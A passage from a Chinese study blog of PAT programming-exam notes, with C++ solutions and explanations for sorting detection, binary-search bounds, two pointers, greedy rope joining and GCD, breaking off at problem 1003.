<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">110</span>;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="keyword">int</span> a[maxn] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> b[maxn] = &#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getStep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (; l*<span class="number">2</span> &lt; N; l *= <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = l; j+<span class="number">2</span>*l &lt; N; j += <span class="number">2</span> * l)<span class="comment">//判断当前步长是否使得局部有序，如果有序，步长应该乘2继续判断</span></span><br><span class="line">            <span class="keyword">if</span> (b[j - <span class="number">1</span>] &gt; b[j]) <span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*参照插入排序的判别*/</span></span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; N<span class="number">-1</span> &amp;&amp; b[k - <span class="number">1</span>] &lt;= b[k]) k++;<span class="comment">//前k项有序</span></span><br><span class="line">    <span class="keyword">int</span> len = k;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; N &amp;&amp; a[k] == b[k]) k++;<span class="comment">//后几项相同</span></span><br><span class="line">    <span class="keyword">if</span> (k == N)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Insertion Sort\n"</span>);</span><br><span class="line">        sort(b,b+len+<span class="number">1</span>);<span class="comment">//下一轮排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>, b[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Merge Sort\n"</span>);</span><br><span class="line">        <span class="comment">/*得到下一次归并的步长*/</span></span><br><span class="line">        <span class="keyword">int</span> step = getStep() * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += step)&#123;</span><br><span class="line">            sort(b + i, b + min(i + step, N));<span class="comment">//这里用个min来得到是否边界</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>, b[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="1055-集体照-（25-分）"><a href="#1055-集体照-（25-分）" class="headerlink" title="1055 集体照 （25 分）"></a>1055 集体照 （25 分）</h2><p>拍集体照时队形很重要，这里对给定的 N 个人 K 排的队形设计排队规则如下：</p>
<ul>
<li>每排人数为 N/K（向下取整），多出来的人全部站在最后一排；</li>
<li>后排所有人的个子都不比前排任何人矮；</li>
<li>每排中最高者站中间（中间位置为 m/2+1，其中 m 为该排人数，除法向下取整）；</li>
<li>每排其他人以中间人为轴，按身高非增序，先右后左交替入队站在中间人的两侧（例如5人身高为190、188、186、175、170，则队形为175、188、190、186、170。这里假设你面对拍照者，所以你的左边是中间人的右边）；</li>
<li>若多人身高相同，则按名字的字典序升序排列。这里保证无重名。</li>
</ul>
<p>现给定一组拍照人，请编写程序输出他们的队形。</p>
<p><strong>输入格式：</strong><br>每个输入包含 1 个测试用例。每个测试用例第 1 行给出两个正整数 $N（≤10^4$，总人数）和 K（≤10，总排数）。随后 N 行，每行给出一个人的名字（不包含空格、长度不超过 8 个英文字母）和身高（[30, 300] 区间内的整数）。<br><strong>输出格式：</strong><br>输出拍照的队形。即K排人名，其间以空格分隔，行末不得有多余空格。注意：假设你面对拍照者，后排的人输出在上方，前排输出在下方。<br><strong>输入样例：</strong></p>
<blockquote>
<p>10 3<br>Tom 188<br>Mike 170<br>Eva 168<br>Tim 160<br>Joe 190<br>Ann 168<br>Bob 175<br>Nick 186<br>Amy 160<br>John 159</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>Bob Tom Joe Nick<br>Ann Mike Eva<br>Tim Amy John</p>
</blockquote>
<h3 id="疑难点"><a href="#疑难点" class="headerlink" title="疑难点"></a>疑难点</h3><ul>
<li>排数以及每行人数不是难点，难点在于每一行的人怎么站，如果被题目逻辑所引导，那么问题很难解决，左右交替站位直接实现很麻烦，但是如果跳出它的逻辑，发现，按大到小排序，每行从中间开始，向左依次是循环加2，向右也是循环加2，就挑出了它的左右交替排序了。</li>
</ul>
<hr>
<h2 id="1095-解码PAT准考证-（25-分）"><a href="#1095-解码PAT准考证-（25-分）" class="headerlink" title="1095 解码PAT准考证 （25 分）"></a>1095 解码PAT准考证 （25 分）</h2><p>PAT 准考证号由 4 部分组成：</p>
<ul>
<li>第 1 位是级别，即 T 代表顶级；A 代表甲级；B 代表乙级；</li>
<li>第 2~4 位是考场编号，范围从 101 到 999；</li>
<li>第 5~10 位是考试日期，格式为年、月、日顺次各占 2 位；</li>
<li>最后 11~13 位是考生编号，范围从 000 到 999。</li>
</ul>
<p>现给定一系列考生的准考证号和他们的成绩，请你按照要求输出各种统计信息。<br><strong>输入格式：</strong><br>输入首先在一行中给出两个正整数 $N（≤10^4）$和 M（≤100），分别为考生人数和统计要求的个数。<br>接下来 N 行，每行给出一个考生的准考证号和其分数（在区间 [0,100] 内的整数），其间以空格分隔。<br>考生信息之后，再给出 M 行，每行给出一个统计要求，格式为：<code>类型 指令</code>，其中</p>
<ul>
<li><code>类型</code> 为 1 表示要求按分数非升序输出某个指定级别的考生的成绩，对应的 <code>指令</code> 则给出代表指定级别的字母；</li>
<li><code>类型</code> 为 2 表示要求将某指定考场的考生人数和总分统计输出，对应的 <code>指令</code> 则给出指定考场的编号；</li>
<li><code>类型</code> 为 3 表示要求将某指定日期的考生人数分考场统计输出，对应的 <code>指令</code> 则给出指定日期，格式与准考证上日期相同。</li>
</ul>
<p><strong>输出格式：</strong><br>对每项统计要求，首先在一行中输出 <code>Case #: 要求</code>，其中 <code>#</code> 是该项要求的编号，从 1 开始；<code>要求</code> 即复制输入给出的要求。随后输出相应的统计结果：</p>
<ul>
<li><code>类型</code> 为 1 的指令，输出格式与输入的考生信息格式相同，即 <code>准考证号 成绩</code>。对于分数并列的考生，按其准考证号的字典序递增输出（题目保证无重复准考证号）；</li>
<li><code>类型</code> 为 2 的指令，按 <code>人数 总分</code> 的格式输出；</li>
<li><code>类型</code> 为 3 的指令，输出按人数非递增顺序，格式为 <code>考场编号 总人数</code>。若人数并列则按考场编号递增顺序输出。<br>如果查询结果为空，则输出 <code>NA</code>。</li>
</ul>
<p><strong>输入样例：</strong></p>
<blockquote>
<p>8 4<br>B123180908127 99<br>B102180908003 86<br>A112180318002 98<br>T107150310127 62<br>A107180908108 100<br>T123180908010 78<br>B112160918035 88<br>A107180908021 98<br>1 A<br>2 107<br>3 180908<br>2 999</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>Case 1: 1 A<br>A107180908108 100<br>A107180908021 98<br>A112180318002 98<br>Case 2: 2 107<br>3 260<br>Case 3: 3 180908<br>107 2<br>123 2<br>102 1<br>Case 4: 2 999<br>NA</p>
</blockquote>
<h3 id="关键点-5"><a href="#关键点-5" class="headerlink" title="关键点"></a>关键点</h3><p>本题应该着重于数据处理，但是到底是边读边处理还是，全部读完后处理。对于类型一和二，其实无所谓，但是对于类型三，实际操作下发现，全部读完后处理数据要方便。如果，边读边处理，那么需要给出所有关于日期的分类，这需要很多数据结构去存储，但是如果读完后处理，那么只需要去找需要的日期，并组成相应的数据结构就可以了。</p>
<p>-综上，本题不应该为了效率去在读数据时处理数据，这样增加了逻辑上的复杂度，我第一次想法就是这样，我觉得这样做，如果第一次做这个题，给定时间应该做不出来的。</p>
<ul>
<li><p>如何处理日期关系，由于类型三所需要的数据结构和学生学号和成绩结构相同，可以借助学生的结构，只是对于每个数据解读不同，例如：学生的id在此时应被解读为考场号，学生的成绩被解读为考场的人数。而且比较的逻辑也一样，这样减少了一个结构和一个比较，减少了重复的逻辑关系。</p>
</li>
<li><p>使用哪几种数据结构，<code>map</code>在此时不是好的，<code>unordered_map</code>为一种更高效的<code>map</code>，应该用它来解决超时问题。</p>
</li>
</ul>
<h3 id="本题用了一些不常见的赋值方法，应该学习使用。"><a href="#本题用了一些不常见的赋值方法，应该学习使用。" class="headerlink" title="本题用了一些不常见的赋值方法，应该学习使用。"></a>本题用了一些不常见的赋值方法，应该学习使用。</h3><ul>
<li>循环获取vector中的元素：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (node n : v)</span><br></pre></td></tr></table></figure>
<ul>
<li>对vector存储</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;node&gt; ans;</span><br><span class="line">ans.push_back(&#123;s,n&#125;);<span class="comment">//可以这么使用，是因为vector的类型是定义过的，已知的</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对map的读取并转换为vector</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一</span></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator it = m.begin(); it != m.end(); it++)&#123;</span><br><span class="line">    ans.push_back(&#123;it-&gt;first,it-&gt;second&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方法二</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it : m) ans.push_back(&#123; it.first, it.second &#125;);</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="类型七：散列"><a href="#类型七：散列" class="headerlink" title="类型七：散列"></a>类型七：散列</h1><p>主要考察<strong>hash</strong>。</p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1005</td>
<td style="text-align:center">继续(3n+1)猜想 （25 分）</td>
<td style="text-align:center">3*n+1的范围需要考虑</td>
</tr>
<tr>
<td style="text-align:center">1059</td>
<td style="text-align:center">C语言竞赛 （20 分）</td>
<td style="text-align:center">逻辑关系</td>
</tr>
<tr>
<td style="text-align:center">B1065</td>
<td style="text-align:center"><strong>单身狗 （25 分）</strong></td>
<td style="text-align:center">注意输出%05d</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="类型八：二分查找"><a href="#类型八：二分查找" class="headerlink" title="类型八：二分查找"></a>类型八：二分查找</h1><p>二分查找的基本思路不用再说了，注意几个点：</p>
<ul>
<li><p>虽然查找条件<code>while(low&lt;=high)</code>也可以写成<code>while(low&lt;high)</code>，但是有区别，前者未找到时，low和high处于第一次<code>low&gt;high</code>的状态；而后者处于<code>low==high</code>的状态。这里统一下，用第一种方法，后面会说为什么这么做。</p>
</li>
<li><p>总是在low~mid-1和mid+1~high之间查找元素。对于mid判断完毕后，不用再包含mid。</p>
</li>
</ul>
<p><strong>二分查找标准代码（查找不到返回-1）</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A为递增数列，x为欲查询的数，函数返回查找到的索引，未查找到返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> low,<span class="keyword">int</span> high,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[mid] &lt; x)&#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &gt; x)&#123;</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二分查找扩展"><a href="#二分查找扩展" class="headerlink" title="二分查找扩展"></a>二分查找扩展</h2><p>基于二分查找，可以进一步扩展两个方法。</p>
<ul>
<li><p><strong>查找第一个大于或等于x的元素位置</strong></p>
</li>
<li><p><strong>查找第一个大于x的元素位置</strong></p>
</li>
</ul>
<h3 id="查找第一个大于或等于x的元素位置"><a href="#查找第一个大于或等于x的元素位置" class="headerlink" title="查找第一个大于或等于x的元素位置"></a><code>查找第一个大于或等于x的元素位置</code></h3><p>原理比较简单，只需要对分支判断中的<strong>等于</strong>做相应处理即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A为递增数列，x为欲查询的数，函数返回查找到的索引，未查找到返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> low,<span class="keyword">int</span> high,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[mid] &lt; x)&#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &gt;= x)&#123;</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里修改了三处：第一，修改了<code>return -1</code>为<code>return low</code>；第二，修改条件<code>if (a[mid] &gt; x)</code>为<code>if (a[mid] &gt;= x)</code>；第三，删除条件<code>return mid</code>。</p>
<p><strong>分析：</strong><br>查找第一个大于或等于x的元素位置，将条件<code>if (a[mid] &gt; x)</code>改为<code>if (a[mid] &gt;= x)</code>，对于只要大于等于x的位置，都在其左半部分查找（降低high）。该条件会导致高位high不断向左靠近，直到最后一个小于x的位置。<br><strong>最终，high和low均指向最后一个小于x的位置。这里要解释下上面为什么while条件中使用<code>(low&lt;=high)</code>，当<code>while (low == high)</code>成立，条件满足<code>if (a[mid] &lt; mp) low = mid + 1;</code>，所以最终能通过low返回第一个大于等于x的索引位置。其目的就是为了保证low在等于high（指向最后一个小于x的位置）时，仍可以多一步运算而指向第一个大于等于的元素。</strong></p>
<h3 id="查找第一个大于x的元素位置"><a href="#查找第一个大于x的元素位置" class="headerlink" title="查找第一个大于x的元素位置"></a><code>查找第一个大于x的元素位置</code></h3><p>同上。只不过等于号加在另一个条件中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A为递增数列，x为欲查询的数，函数返回查找到的索引，未查找到返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> low,<span class="keyword">int</span> high,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[mid] &lt;= x)&#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &gt; x)&#123;</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与上面唯一的不同在于将等号放在了条件<code>if (a[mid] &lt;= x)</code>中，但是却将最终结果变成了查找第一个大于x的元素位置。</p>
<p><strong>分析：</strong><br>此时，对于小于等于x的情况，都是在右半部分查找（提高low），该条件会导致低位low不断向右靠近，直到最后一个小于或等于x的位置。<br>当（low==high）时，将<code>low = mid+1</code>，最终将返回第一个大于x的位置索引。</p>
<p><strong>需注意的题目</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1030</td>
<td style="text-align:center"><strong>完美数列 （25 分）</strong></td>
<td style="text-align:center">查找第一个大于x的元素位置</td>
</tr>
</tbody>
</table>
<h2 id="1030-完美数列-（25-分）"><a href="#1030-完美数列-（25-分）" class="headerlink" title="1030 完美数列 （25 分）"></a>1030 完美数列 （25 分）</h2><p>给定一个正整数数列，和正整数 p，设这个数列中的最大值是 M，最小值是 m，如果 M≤mp，则称这个数列是完美数列。</p>
<p>现在给定参数 p 和一些正整数，请你从中选择尽可能多的数构成一个完美数列。</p>
<p><strong>输入格式：</strong><br>输入第一行给出两个正整数 N 和 p，其中 $N（≤10^5）$是输入的正整数的个数，$p（≤10^9）$是给定的参数。第二行给出 N 个正整数，每个数不超过 $10^9$。<br><strong>输出格式：</strong><br>在一行中输出最多可以选择多少个数可以用它们组成一个完美数列。<br><strong>输入样例：</strong></p>
<blockquote>
<p>10 8<br>2 3 20 4 5 1 6 7 8 9</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>8</p>
</blockquote>
<h3 id="注意点-2"><a href="#注意点-2" class="headerlink" title="注意点"></a>注意点</h3><ul>
<li><p>是在这个数列中选择最长的完美数列，所以应对每一个数进行完美数列的判断。</p>
</li>
<li><p><strong>long long类型不自动转换</strong></p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> mp;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">mp = a*a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld"</span>,mp);<span class="comment">//结果为：0</span></span><br></pre></td></tr></table></figure>
<p>想要得到a*a的正确结果，要加类型转换：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> mp;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">mp = a*a;<span class="comment">//要在a前加(long long)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld"</span>,mp);<span class="comment">//结果为：1099511627776</span></span><br></pre></td></tr></table></figure>
<p>同理，知道，c语言不像java那样可以根据声明类型自动转换类型，所以，以后类型转换一定要手动添加。</p>
<p>此题有两个解法：<strong>二分查找和双指针法</strong></p>
<hr>
<h1 id="类型九：贪心问题"><a href="#类型九：贪心问题" class="headerlink" title="类型九：贪心问题"></a>类型九：贪心问题</h1><p>简单地讲，就一句话，<strong>局部最优解将作为整体最优解就是贪心。</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1070</td>
<td style="text-align:center"><strong>结绳 （25 分）</strong></td>
<td style="text-align:center">弄清逻辑再动手</td>
</tr>
</tbody>
</table>
<h2 id="1070-结绳-（25-分）"><a href="#1070-结绳-（25-分）" class="headerlink" title="1070 结绳 （25 分）"></a>1070 结绳 （25 分）</h2><p>给定一段一段的绳子，你需要把它们串成一条绳。每次串连的时候，是把两段绳子对折，再如下图所示套接在一起。这样得到的绳子又被当成是另一段绳子，可以再次对折去跟另一段绳子串连。每次串连后，原来两段绳子的长度就会减半。<br><img src="/images/1070 结绳 （25 分）.jpg" alt="Alt text"></p>
<p>给定 N 段绳子的长度，你需要找出它们能串成的绳子的最大长度。<br><strong>输入格式：</strong><br>每个输入包含 1 个测试用例。每个测试用例第 1 行给出正整数 $N (2≤N≤10^4)$；第 2 行给出 N 个正整数，即原始绳段的长度，数字间以空格分隔。所有整数都不超过$10^4$ 。<br><strong>输出格式：</strong><br>在一行中输出能够串成的绳子的最大长度。结果向下取整，即取为不超过最大长度的最近整数。<br><strong>输入样例：</strong></p>
<blockquote>
<p>8<br>10 15 12 3 4 13 1 15</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>14</p>
</blockquote>
<h3 id="注意点-3"><a href="#注意点-3" class="headerlink" title="注意点"></a>注意点</h3><ul>
<li>搞清楚逻辑，14是怎么得到的，<strong>为了得到最长的绳子，较长的绳子则应该被较少次数的对折。</strong>需要将所有的绳子从短到长排序，从短的开始，每两个对折连接。输入样例排序：</li>
</ul>
<blockquote>
<p>1 3 4 10 12 13 15 15</p>
</blockquote>
<p>${1\over 2} + {3\over 2} = 2$<br>${2\over 2} + {4\over 2} = 3$<br>${3\over 2} + {10\over 2} = 6.5$<br>${6.5\over 2} + {12\over 2} = 9.25$<br>${9.25\over 2} + {13\over 2} = 11.125$<br>${11.125\over 2} + {15\over 2} = 13.0625$<br>${13.0625\over 2} + {15\over 2} = 14.03125$</p>
<p>最后取整，得到14。</p>
<ul>
<li>只有两个绳子的情况，循环首先应将开始置为第一个数，从第二个数开始循环。否则，会导致逻辑问题。</li>
</ul>
<hr>
<h1 id="类型十：双指针"><a href="#类型十：双指针" class="headerlink" title="类型十：双指针"></a>类型十：双指针</h1><p>一般针对有序序列，双指针有着很大的作用。举一道LeetCode的题目：<strong>1.TwoSum</strong>，就利用了排序+双指针来处理。</p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1030</td>
<td style="text-align:center"><strong>完美数列（25分）</strong></td>
<td style="text-align:center">逻辑，二维vector</td>
</tr>
</tbody>
</table>
<h2 id="B1030以双指针方式实现"><a href="#B1030以双指针方式实现" class="headerlink" title="B1030以双指针方式实现"></a>B1030以双指针方式实现</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100010</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn] = &#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*双指针法*/</span></span><br><span class="line">    <span class="keyword">int</span> N, p;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> mp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;N,&amp;p);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a, a + N);</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>,high = <span class="number">0</span>;<span class="comment">//high赋值一次即可</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N;i++)&#123;</span><br><span class="line">        mp = (<span class="keyword">long</span> <span class="keyword">long</span>)a[i] * p;</span><br><span class="line">        <span class="keyword">while</span> (high &lt; N)&#123;</span><br><span class="line">            <span class="keyword">if</span> (a[high] &lt;= mp) high++;<span class="comment">//对于后面的数来说，a[high]要么是第一个大于mp的数，要么是小于等于mp的数。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        max = max &gt; high - i? max : high - i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,max);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="类型十一：数学问题"><a href="#类型十一：数学问题" class="headerlink" title="类型十一：数学问题"></a>类型十一：数学问题</h1><p>涉及一些数学规律的发现和分析，要仔细，不急躁的处理这种问题。</p>
<h2 id="分数处理"><a href="#分数处理" class="headerlink" title="分数处理"></a>分数处理</h2><p>两个分数间的大小比较，可以利用交换律，改为乘法比较，这样不会出现小数double的精度问题。虽然乘法有溢出问题，但是只要注意溢出，他是比实际除法小数要好。</p>
<p>${n1\over m1} &gt; {n2 \over m2}  ⇒ n1m2 &gt; m1n2$</p>
<h2 id="最小公约数"><a href="#最小公约数" class="headerlink" title="最小公约数"></a>最小公约数</h2><h3 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a><code>欧几里得算法</code></h3><p>计算两个非负数a和b的最大公约数：若b是0，则最大公约数为a。否则，将a除以b得到的余数r，a和b的最大公约数即为b和r的最大公约数。<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b, a%b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1003</td>
<td style="text-align:center"><strong>我要通过！（20 分）</strong></td>
<td style="text-align:center">数学规律分析</td>
</tr>
<tr>
<td style="text-align:center">B1019</td>
<td style="text-align:center">数字黑洞 （20 分）</td>
<td style="text-align:center">0补位</td>
</tr>
<tr>
<td style="text-align:center">B1034</td>
<td style="text-align:center"><strong>有理数四则运算 （20 分）</strong></td>
<td style="text-align:center">struct分数的四则运算</td>
</tr>
<tr>
<td style="text-align:center">B1040</td>
<td style="text-align:center"><strong>有几个PAT （25 分）</strong></td>
<td style="text-align:center">动态规划</td>
</tr>
<tr>
<td style="text-align:center">B1045</td>
<td style="text-align:center"><strong>快速排序 （25 分）</strong></td>
<td style="text-align:center">动态规划</td>
</tr>
<tr>
<td style="text-align:center">B1049</td>
<td style="text-align:center"><strong>数列的片段和 （20 分）</strong></td>
<td style="text-align:center">数学规律分析</td>
</tr>
<tr>
<td style="text-align:center">B1051</td>
<td style="text-align:center"><strong>复数乘法 （15 分）</strong></td>
<td style="text-align:center">sin,cos,边界检查</td>
</tr>
<tr>
<td style="text-align:center">B1060</td>
<td style="text-align:center"><strong>爱丁顿数 （25 分）</strong></td>
<td style="text-align:center">数学规律分析</td>
</tr>
<tr>
<td style="text-align:center">B1062</td>
<td style="text-align:center"><strong>最简分数 （20 分）</strong></td>
<td style="text-align:center">小数精度有限，利用乘法</td>
</tr>
</tbody>
</table>
<h2 id="1003-我要通过！-（20-分）"><a href="#1003-我要通过！-（20-分）" class="headerlink" title="1003 我要通过！ （20 分）"></a>1003 我要通过！ （20 分）</h2><p>“答案正确”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“答案正确”大派送 —— 只要读入的字符串满足下列条件，系统就输出“答案正确”，否则输出“答案错误”。<br>得到“答案正确”的条件是：</p>
<ol>
